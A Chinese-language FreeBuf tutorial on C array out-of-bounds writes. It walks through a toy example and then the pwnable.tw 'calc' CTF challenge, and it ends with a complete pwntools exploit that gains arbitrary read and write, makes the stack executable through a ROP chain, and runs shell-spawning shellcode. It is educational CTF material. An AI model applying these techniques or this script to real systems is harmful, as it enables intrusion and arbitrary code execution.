***本文作者：Lkerenl，本文属 FreeBuf 原创奖励计划，未经许可禁止转载。**

## 前言

 **数组越界访问是c程序常见的错误之一，由于c语言并不向Java等语言对数组下标有严格的检查，一旦出现越界，就有可能造成严重的后果。**

![med_1411386838_1402423575_00020.jpg](https://image.3001.net/images/20181116/15423617241300.jpg!small)

## 数组越界访问

看下边一个例子：:

    
    
    #include <stdio.h>
    #include <stdlib.h>
    
    int target = 0xdeadbeef;
    
    int main()
    {   
        int a[20] = {0xdeadbeef};
        int index,value;
        printf("%x\n",a);
        scanf("%d%d", &index, &value);
        a[index] = value;
        if (target == 0x27)
            printf("Congratulations!\n");
        else
        {
            printf("try again.\n");
        }
        return 0;
    }
    

以32位为例：

    
    
    gcc -m32 Array-out-of-bounds.c -g0 -o 32
    

栈空间：

    
    
    00:0000│ esp  0xffffcdb0 —▸ 0x8048634 ◂— and    eax, 0x642564 /* '%d%d' */
    01:0004│      0xffffcdb4 —▸ 0xffffcdc4 —▸ 0xf7ffd918 ◂— 0x0
    02:0008│      0xffffcdb8 —▸ 0xffffcdc8 —▸ 0xffffcde0 ◂— 0x0
    03:000c│      0xffffcdbc ◂— 0x0
    04:0010│      0xffffcdc0 —▸ 0xf7ffd000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x23f3c
    05:0014│ eax  0xffffcdc4 —▸ 0xf7ffd918 ◂— 0x0
    06:0018│      0xffffcdc8 —▸ 0xffffcde0 ◂— 0x0
    07:001c│      0xffffcdcc ◂— 0xdeadbeef
    08:0020│      0xffffcdd0 ◂— 0x0
    ... ↓
    1b:006c│ edi  0xffffce1c ◂— 0xc4907500
    1c:0070│      0xffffce20 —▸ 0xffffce40 ◂— 0x1
    1d:0074│      0xffffce24 —▸ 0xf7fb3000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0
    1e:0078│ ebp  0xffffce28 ◂— 0x0
    1f:007c│      0xffffce2c —▸ 0xf7e19637 (__libc_start_main+247) ◂— add    esp, 0x10
    

此时我们可以看到`a`的地址为`0xffffcdcc`而内存访问数组的方法是：

    
    
       0x8048549 <main+94>     add    esp, 0x10
       0x804854c <main+97>     mov    eax, dword ptr [ebp - 0x64]
       0x804854f <main+100>    mov    edx, dword ptr [ebp - 0x60]
       0x8048552 <main+103>    mov    dword ptr [ebp + eax*4 - 0x5c], edx
    

即 `ebp-0x5c`为`a`的地址，再加上`eax`也就是索引乘4，如果我们要修改`target`的值：

    
    
    pwndbg> p/x ⌖
    $3 = 0x804a028
    

即`0xffffcdcc + eax * 4 == 0x804a028`解方程。我们因为是32位，所以我们可以把这个方程看成：

    
    
    (0xffffcdcc + eax * 4) & 0xffffffff  == 0x804a028
    

因为有很多值，我们就取一个：

    
    
    In [5]: (0x10804a028-0xffffcdcc)/4
    Out[5]: 0x2013497
    

成功修改：

    
    
    pwndbg> c
    Continuing.
    ffffcdcc
    33633431 39
    ...
    pwndbg> p $ebp + $eax*4 - 0x5c
    $5 = (void *) 0x804a028 <target>
    pwndbg> n
    ...
    pwndbg> p/x target
    $6 = 0x27
    

修改成功，退出调试环境再试一下。

    
    
    ➜  Array-out-of-bounds ./32          
    ffd8e7fc
    34270731 39
    Congratulations!
    

接下来通过pwnable.tw的一道calc实战一下

## pwnable.tw-calc

nc连上去看看：

    
    
    ➜  ~ nc chall.pwnable.tw 10100
    === Welcome to SECPROG calculator ===
    1+3
    4
    1-3
    -2
    2+-2
    expression error!
    -2+2
    2
    0+0
    prevent division by zero
    -0+1
    prevent division by zero
    +1+1
    2
    +5-7
    -7
    Merry Christmas!
    

随便输入点什么，可以看到有些奇怪的输出。打开ida加载分析一下、逻辑很简单：

    
    
    unsigned int calc()
    {
      int result[101]; // [esp+18h] [ebp-5A0h]
      char expr; // [esp+1ACh] [ebp-40Ch]
      unsigned int v3; // [esp+5ACh] [ebp-Ch]
    
      v3 = __readgsdword(0x14u);
      while ( 1 )
      {
        bzero(&expr, 0x400u);
        if ( !get_expr((int)&expr, 1024) )
          break;
        init_pool(result);
        if ( parse_expr(&expr, result) )
        {
          printf(("%d\n", result[result[0] - 1 + 1]);
          fflush(stdout);
        }
      }
      return __readgsdword(0x14u) ^ v3;
    }
    

主要就是这个calc的函数，可以看到一开始读了canary到栈里，然后从命令行读一行字符串然后调用`parse_expr`来计算，结果放在`result[size
-1]`处。`get_expr`的逻辑就是一个字符一个字符读到s里并过滤掉除`[0-9]*+-\%`的字符。`init_pool`这个函数初始化了一段大小为100*4内存空间。暂时不知道干什么用的，不过通过`calc`的那个`printf`可以推断出这里边放有计算的结果。`parse_expr`首先是个for循环对输入的表达式进行遍历。

    
    
            v9 = atoi(tmp_num);
          if ( v9 > 0 )
          {
            v4 = (*result)++;            // 保存数字，result个数+1
            result[v4 + 1] = v9;
          }
          if ( expr[i] && (unsigned int)(expr[i + 1] - '0') > 9 )
          {
            puts("expression error!");
            fflush(stdout);
            return 0;
          }
          num_start = &expr[i + 1];
          if ( s[v7] )
          {
            switch ( expr[i] )
            {
              case '%':
              case '*':
              case '/':
                if ( s[v7] != '+' && s[v7] != '-' )
                {
                  eval(result, s[v7]);
                  s[v7] = expr[i];
                }
                else
                {
                  s[++v7] = expr[i];
                }
                break;
              case '+':
              case '-':
                eval(result, s[v7]);
                s[v7] = expr[i];
                break;
              default:
                eval(result, s[v7--]);
                break;
            }
          }
          else
          {
            s[v7] = expr[i];
          }
    

result为数字栈，s为符号栈，result[0]保存当前数字栈里的数字的个数。通过一个switch来判断符号类型，确定运算顺序，最后一个while从右向左计算表达式。

    
    
      while ( v7 >= 0 )
        eval(result, s[v7--]);
    

通过eval函数计算表达式：

    
    
    //eval(result, s[v7]);
    int *__cdecl eval(int *result, char a2)
    {
      int *a3; // eax
    
      if ( a2 == '+' )
      {
        result[*result - 1] += result[*result];
      }
      else if ( a2 > '+' )
      {
        if ( a2 == '-' )
        {
          result[*result - 1] -= result[*result];
        }
        else if ( a2 == '/' )
        {
          result[*result - 1] /= result[*result];
        }
      }
      else if ( a2 == '*' )
      {
        result[*result - 1] *= result[*result];
      }
      a3 = result;
      --*result;
      return a3;
    }
    

我们可以看到在`eval`函数中，因为没有检查`result[0]`的值，如果我们能够控制`result[0]`的值，我们就可以造成任意地址的写入，绕过`canary`修改返回地址形成栈溢出。而且在函数`calc`中，如果我们能控制`result[0]`就可以通过`printf("%d\n",
result[result[0] - 1 +
1]);`读取任意地址。那么我们如何在能控制`result[0]`的值呢，考虑我们在nc时的输入，发现在输入由符号开始的表达式时，如`+20`因为第一个字符为符号`+`而只有一个数字，那么在这样的情况下执行`eval时`，`result[*result
- 1] += result[*result];`就会变成`result[1-1]+=result[1];`成功控制了`result[0]`的值。

## 攻击流程

我们首先利用数组越界造成的任意地址读写，将`__stack_prot`改成`0x7`，接着构造ROP链，使其执行`_dl_make_stack_executable<__libc_stack_end>`(注意这里的`__libc_stack_end`在eax内)，就能关闭`NX`保护，然后我们就利用`jmp
esp`或者`call esp`劫持eip到栈上从而getshell。

## exp

    
    
    from pwn import *
    
    filename = "./calc"
    context.binary = filename
    elf = ELF(filename)
    
    if args.A:
        p = remote('chall.pwnable.tw',10100)
    else:
        p = process(filename)
        context.log_level = 'debug'
    
    stack_addr = None
    pop_eax = 0x0805c34b #pop eax; ret
    jmp_esp = 0x080e3f63 #jmp esp
    
    def g(cmd=None):
        gdb.attach(p,cmd)
    
    def w(offset,value):
        offset = str(offset)
        p.sendline("+"+offset)
        orgin = int(p.recvuntil('\n')[:-1])
        if value - orgin >= 0x7fffffff:
            #import pdb;pdb.set_trace()
            value = unpack( pack(value),'all',sign=True)
            value = -(orgin - value)
        else:
            value -= orgin
        p.sendline("+" + offset + ('+' if value > 0 else '-') + str(abs(value)))
        p.recvuntil('\n')
    
    def get_stack_addr():
        global stack_addr
        p.sendline("+360")
        orgin = int(p.recvuntil('\n')[:-1])
        stack_addr = u32(pack(orgin-1472))
        log.info("get offset_base: %#x" % stack_addr)    
    
    def exp():
        p.recvuntil("===\n")
    
        get_stack_addr()
    
        z = (0x1080ebfec - (stack_addr))/4
        log.info("__stack_prot offset: %#x" % z)
        p.sendline('+%d-%d' % (z,0xfffff9))
        p.recvuntil('\n')
        w(361,pop_eax)
        w(362,elf.sym['__libc_stack_end'])
        w(363,elf.sym['_dl_make_stack_executable'])
    
        w(364,jmp_esp)
    
        shellcode = asm(shellcraft.sh())
        shellcode = [u32(shellcode[x:x+4]) for x in range(0,len(shellcode),4)]
        for _ in range(0,len(shellcode)):
            w(365+_, shellcode[_])
    
        p.send('\n')
    
        p.interactive()
    
    if __name__ == "__main__":
        exp()
    

注意因为`atoi`会将超过`0x7ffffffff`的数转换为`0x7fffffff`，所以写exp的时候要注意。

 ***本文作者：Lkerenl，本文属 FreeBuf 原创奖励计划，未经许可禁止转载。**

